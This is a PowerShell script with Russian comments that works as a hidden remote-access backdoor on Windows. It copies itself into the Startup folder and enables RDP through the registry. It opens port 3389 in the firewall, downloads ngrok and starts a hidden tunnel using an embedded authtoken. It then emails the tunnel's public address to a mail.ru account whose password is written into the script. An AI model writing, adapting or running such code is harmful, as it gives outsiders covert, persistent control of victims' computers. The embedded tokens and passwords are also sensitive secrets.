Start-Sleep -Seconds 10  # Подождать появления сети

# === Логирование ===
$logFile = "$env:TEMP\ngrok_log.txt"
function Log($msg) {
    "[$(Get-Date -Format s)] $msg" | Out-File -FilePath $logFile -Encoding UTF8 -Append
}
Log "=== Script started ==="

# === Путь текущего скрипта ===
$thisScript = $MyInvocation.MyCommand.Path
Log "Current script: $thisScript"

# === Копирование в автозагрузку ===
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ngrok.ps1"
if ($thisScript -ne $startupPath -and -not (Test-Path $startupPath)) {
    Copy-Item -Path $thisScript -Destination $startupPath -Force
    Log "The script has been copied to startup."
    exit
}

# === Включаем RDP ===
try {
    Start-Process reg.exe -ArgumentList 'add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' -Verb RunAs -WindowStyle Hidden | Out-Null
    Log "RDP enabled"
} catch {
    Log "Error when enabling RDP: $_"
}

# === Открываем порт 3389 в Firewall ===
try {
    Start-Process netsh -ArgumentList 'advfirewall firewall add rule name="ngrok RDP" dir=in action=allow protocol=TCP localport=3389' -WindowStyle Hidden | Out-Null
    Log "Firewall rule added"
} catch {
    Log "Error adding firewall rule: $_"
}

# === Скачивание и установка ngrok ===
$ngrokDir = "$env:APPDATA\ngrok2"
$ngrokExe = Join-Path $ngrokDir "ngrok.exe"
$tempZip  = "$env:TEMP\ngrok.zip"

if (-not (Test-Path $ngrokExe)) {
    try {
        Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile $tempZip
        Expand-Archive -Path $tempZip -DestinationPath $ngrokDir -Force
        Log "Ngrok downloaded and unpacked"
    } catch {
        Log "Error while downloading ngrok: $_"
    }
} else {
    Log "Ngrok is installed"
}

# === Создание конфигурации ngrok ===
$ngrokConfig = "$ngrokDir\ngrok.yml"

if (!(Test-Path $ngrokDir)) {
    if (!(Test-Path $ngrokConfigDir)) {
        New-Item -ItemType Directory -Path $ngrokConfigDir -Force | Out-Null
    }

    @"
authtoken: 2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua
tunnels:
  rdp:
    addr: 3389
    proto: tcp
"@ | Out-File -Encoding ASCII $ngrokConfig
}

# === Запуск туннеля ===
try {
    Start-Process -FilePath $ngrokExe -ArgumentList "start --config `"$ngrokConfig`" rdp" -WindowStyle Hidden
    Log "Ngrok launched"
} catch {
    Log "Error while launching ngrok: $_"
}

# === Ожидание появления tunnelAddress ===
$tunnelAddress = $null
for ($i = 0; $i -lt 30; $i++) {
    try {
        $resp = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -TimeoutSec 2
        $t = $resp.tunnels | Where-Object { $_.proto -eq "tcp" }
        if ($t -and $t.public_url) {
            $tunnelAddress = $t.public_url
            Log "Recieved a tunnelAddress: $tunnelAddress"
            break
        }
    } catch {
        Start-Sleep -Seconds 1
    }
}
if (-not $tunnelAddress) {
    Log "Couldn't get tunnelAddress"
}

# === Отправка письма через Mail.ru ===
$smtpServer = "smtp.mail.ru"
$smtpPort   = 587
$smtpUser   = "user.default00@mail.ru"
$smtpPass   = "DggLc7dSWENCbM56151O"

$from = $smtpUser
$to   = $smtpUser
$subj = "Ngrok RDP address"
$body = if ($tunnelAddress) {
    "Ngrok public TCP address: $tunnelAddress"
} else {
    "ERROR: ngrok tunnel not obtained"
}

try {
    Log "Attempt to send email"
    $securePass = ConvertTo-SecureString $smtpPass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($smtpUser, $securePass)
    Send-MailMessage -From $from -To $to -Subject $subj -Body $body `
        -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $cred -ErrorAction Stop
    Log "Email successfully sent "
} catch {
    Log "Error while sending email: $($_)"
}
